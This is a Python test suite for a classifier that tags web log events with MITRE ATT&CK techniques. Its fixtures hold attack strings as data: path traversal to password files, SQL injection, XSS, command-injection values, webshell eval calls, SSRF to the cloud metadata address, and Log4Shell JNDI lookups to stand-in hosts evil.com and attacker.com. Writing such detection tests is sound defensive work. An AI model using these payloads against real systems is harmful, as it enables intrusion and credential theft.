from __future__ import annotations

from datetime import datetime, timezone

from services.mitre import TECHNIQUE_CATALOG, classify
from core.models import LogEvent


def _event(
    path: str = "/",
    method: str = "GET",
    status: int = 200,
    user_agent: str = "Mozilla/5.0",
) -> LogEvent:
    return LogEvent(
        timestamp=datetime(2026, 3, 10, 12, 0, 0, tzinfo=timezone.utc),
        remote_addr="10.0.0.1",
        method=method,
        path=path,
        status=status,
        user_agent=user_agent,
        message=f"{method} {path} HTTP/1.1",
    )


class TestTechniqueCatalog:
    def test_catalog_has_entries(self):
        assert len(TECHNIQUE_CATALOG) >= 10

    def test_all_entries_have_required_fields(self):
        for tid, technique in TECHNIQUE_CATALOG.items():
            assert technique.technique_id == tid
            assert technique.name
            assert technique.tactic


class TestPathTraversal:
    def test_dot_dot_slash(self):
        techniques = classify(_event(path="/../../etc/passwd"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_encoded_traversal(self):
        techniques = classify(_event(path="/%2e%2e/%2e%2e/etc/shadow"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_double_encoded(self):
        techniques = classify(_event(path="/%252e%252e/secret"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids


class TestSqlInjection:
    def test_union_select(self):
        techniques = classify(_event(path="/search?q=1 UNION SELECT * FROM users"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_or_1_equals_1(self):
        techniques = classify(_event(path="/login?user=admin' or '1'='1"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_sleep_injection(self):
        techniques = classify(_event(path="/api?id=1;+sleep(5)"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_information_schema(self):
        techniques = classify(
            _event(path="/api?q=SELECT+table_name+FROM+information_schema.tables")
        )
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids


class TestXss:
    def test_script_tag(self):
        techniques = classify(_event(path="/page?input=<script>alert(1)</script>"))
        ids = [t.technique_id for t in techniques]
        assert "T1203" in ids

    def test_javascript_protocol(self):
        techniques = classify(_event(path="/redirect?url=javascript:alert(1)"))
        ids = [t.technique_id for t in techniques]
        assert "T1203" in ids

    def test_event_handler(self):
        techniques = classify(_event(path="/page?img=<img+onerror=alert(1)>"))
        ids = [t.technique_id for t in techniques]
        assert "T1203" in ids

    def test_encoded_script(self):
        techniques = classify(_event(path="/page?x=%3cscript%3ealert(1)%3c/script%3e"))
        ids = [t.technique_id for t in techniques]
        assert "T1203" in ids


class TestCommandInjection:
    def test_semicolon_cat(self):
        techniques = classify(_event(path="/api?cmd=; cat /etc/passwd"))
        ids = [t.technique_id for t in techniques]
        assert "T1059.004" in ids

    def test_pipe_whoami(self):
        techniques = classify(_event(path="/api?input=| whoami"))
        ids = [t.technique_id for t in techniques]
        assert "T1059.004" in ids

    def test_backticks(self):
        techniques = classify(_event(path="/api?name=`id`"))
        ids = [t.technique_id for t in techniques]
        assert "T1059.004" in ids

    def test_dollar_parens(self):
        techniques = classify(_event(path="/api?x=$(cat /etc/shadow)"))
        ids = [t.technique_id for t in techniques]
        assert "T1059.004" in ids


class TestWebshell:
    def test_cmd_php(self):
        techniques = classify(_event(path="/uploads/cmd.php"))
        ids = [t.technique_id for t in techniques]
        assert "T1505.003" in ids

    def test_c99_shell(self):
        techniques = classify(_event(path="/tmp/c99.php"))
        ids = [t.technique_id for t in techniques]
        assert "T1505.003" in ids

    def test_eval_in_url(self):
        techniques = classify(_event(path="/api?code=eval(base64_decode('abc'))"))
        ids = [t.technique_id for t in techniques]
        assert "T1505.003" in ids


class TestSsrf:
    def test_localhost(self):
        techniques = classify(_event(path="/proxy?url=http://localhost:8080/admin"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_metadata_endpoint(self):
        techniques = classify(_event(path="/proxy?url=http://169.254.169.254/metadata"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_file_protocol(self):
        techniques = classify(_event(path="/api?url=file:///etc/passwd"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids


class TestLog4Shell:
    def test_jndi_in_path(self):
        techniques = classify(_event(path="/api?x=${jndi:ldap://evil.com/a}"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_jndi_in_user_agent(self):
        techniques = classify(
            _event(
                path="/",
                user_agent="${jndi:ldap://attacker.com/exploit}",
            )
        )
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids

    def test_encoded_jndi(self):
        techniques = classify(_event(path="/api?x=%24%7bjndi:ldap://evil.com/a%7d"))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids


class TestSensitivePaths:
    def test_env_file(self):
        techniques = classify(_event(path="/.env"))
        ids = [t.technique_id for t in techniques]
        assert "T1592" in ids

    def test_git_directory(self):
        techniques = classify(_event(path="/.git/HEAD"))
        ids = [t.technique_id for t in techniques]
        assert "T1592" in ids

    def test_etc_passwd(self):
        techniques = classify(_event(path="/etc/passwd"))
        ids = [t.technique_id for t in techniques]
        assert "T1592" in ids

    def test_aws_credentials(self):
        techniques = classify(_event(path="/.aws/credentials"))
        ids = [t.technique_id for t in techniques]
        assert "T1592" in ids


class TestScannerDetection:
    def test_wp_admin_path(self):
        techniques = classify(_event(path="/wp-admin/"))
        ids = [t.technique_id for t in techniques]
        assert "T1595.002" in ids

    def test_phpmyadmin(self):
        techniques = classify(_event(path="/phpmyadmin/"))
        ids = [t.technique_id for t in techniques]
        assert "T1595.002" in ids

    def test_sqlmap_user_agent(self):
        techniques = classify(_event(user_agent="sqlmap/1.6.12#stable"))
        ids = [t.technique_id for t in techniques]
        assert "T1595.002" in ids

    def test_nikto_user_agent(self):
        techniques = classify(_event(user_agent="Nikto/2.1.6"))
        ids = [t.technique_id for t in techniques]
        assert "T1595.002" in ids

    def test_gobuster_user_agent(self):
        techniques = classify(_event(user_agent="gobuster/3.6"))
        ids = [t.technique_id for t in techniques]
        assert "T1595.002" in ids


class TestBotDetection:
    def test_generic_bot_ua(self):
        techniques = classify(_event(user_agent="CustomBotCrawler/1.0"))
        ids = [t.technique_id for t in techniques]
        assert "T1595" in ids

    def test_scanner_ua_not_double_tagged(self):
        techniques = classify(_event(user_agent="sqlmap/1.6"))
        ids = [t.technique_id for t in techniques]
        count_t1595 = sum(1 for t in techniques if t.technique_id == "T1595")
        assert count_t1595 == 0


class TestStatusBasedRules:
    def test_401_triggers_brute_force(self):
        techniques = classify(_event(status=401))
        ids = [t.technique_id for t in techniques]
        assert "T1110" in ids

    def test_403_triggers_brute_force(self):
        techniques = classify(_event(status=403))
        ids = [t.technique_id for t in techniques]
        assert "T1110" in ids

    def test_500_triggers_dos(self):
        techniques = classify(_event(status=500))
        ids = [t.technique_id for t in techniques]
        assert "T1499" in ids

    def test_unusual_method_with_error(self):
        techniques = classify(_event(method="DELETE", status=405))
        ids = [t.technique_id for t in techniques]
        assert "T1190" in ids


class TestDeduplication:
    def test_no_duplicate_technique_ids(self):
        techniques = classify(
            _event(
                path="/../../etc/passwd?q='+OR+1=1--",
                user_agent="sqlmap/1.6",
                status=403,
            )
        )
        ids = [t.technique_id for t in techniques]
        assert len(ids) == len(set(ids))

    def test_highest_confidence_kept(self):
        techniques = classify(
            _event(
                path="/../../etc/passwd?q='+UNION+SELECT+*+FROM+users",
            )
        )
        t1190_list = [t for t in techniques if t.technique_id == "T1190"]
        assert len(t1190_list) == 1
        assert t1190_list[0].confidence >= 0.9

    def test_sorted_by_confidence(self):
        techniques = classify(
            _event(
                path="/../../etc/passwd",
                status=403,
            )
        )
        if len(techniques) > 1:
            for i in range(len(techniques) - 1):
                assert techniques[i].confidence >= techniques[i + 1].confidence


class TestNormalTraffic:
    def test_clean_request_no_techniques(self):
        techniques = classify(
            _event(
                path="/api/v1/users/42",
                status=200,
                user_agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            )
        )
        assert len(techniques) == 0

    def test_static_resource_no_techniques(self):
        techniques = classify(
            _event(
                path="/static/app.js",
                status=200,
                user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            )
        )
        assert len(techniques) == 0
